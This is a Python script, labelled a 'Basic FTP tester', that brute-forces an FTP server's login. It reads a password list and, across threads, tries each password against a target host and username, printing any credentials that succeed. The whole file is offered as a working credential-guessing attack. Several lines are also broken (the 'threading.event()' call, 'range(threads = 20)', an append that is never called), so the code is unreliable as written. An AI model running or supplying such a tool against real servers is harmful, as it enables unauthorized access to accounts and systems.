import ftplib
import argparse
import threading
from  queue import Queue

parser = argparse.ArgumentParser(description="Basic FTP tester")


parser.add_argument("-ho","--host",required=True, type=str, help="Enter the target to test ftp")
parser.add_argument("-p","--passfile",required=True,type=str,help="Enter the path of file containing password list")
parser.add_argument("-t","--threads",type=int,help="enter the number of threads. Default : 20")
parser.add_argument("-u","--user",required=True,type=str,help="enter the Username to connect to provided host")

args = parser.parse_args()



host = args.host
user = args.user
passfile = args.passfile
threads = args.threads


def passwd(passfile):
    with open(passfile , 'r', encoding='utf-8') as f:
        return[line.strip('\n') for line in f]

passwords = passwd(passfile)
passwords_iter = iter(passwords)
event_done = threading.event()



def workers():
    while not event_done.is_set():
        try:
            password = next(passwords_iter)
        except StopIteration:
            break
        try:
            with ftplib.FTP() as serve:
                serve.connect(host,21,timeout=5)
                serve.login(user,password)
                print("||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
                print("===========================================================================\n")
                print(" The Password was Found and Connection was Success\n")
                print(f"Connect with {host} as {user}  :   {password}\n")
                break
        
        except Exception as e:
            print(f"Connection failed with {user}  :   {password}")






'''for password in passwords:
    try:
        with ftplib.FTP() as serve:
            serve.connect(host,21,timeout=5)
            serve.login(user,password)
            print("||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
            print("===========================================================================\n")
            print(" The Password was Found and Connection was Success\n")
            print(f"Connect with {host} as {user}  :   {password}\n")
            break


    except Exception as e:
        print(f"Connection failed with {user}  :   {password}")'''



threads = []
for _ in range(threads = 20):
    t= threading.Thread(target=workers)
    t.start()
    threads.append



for t in threads:
    t.join()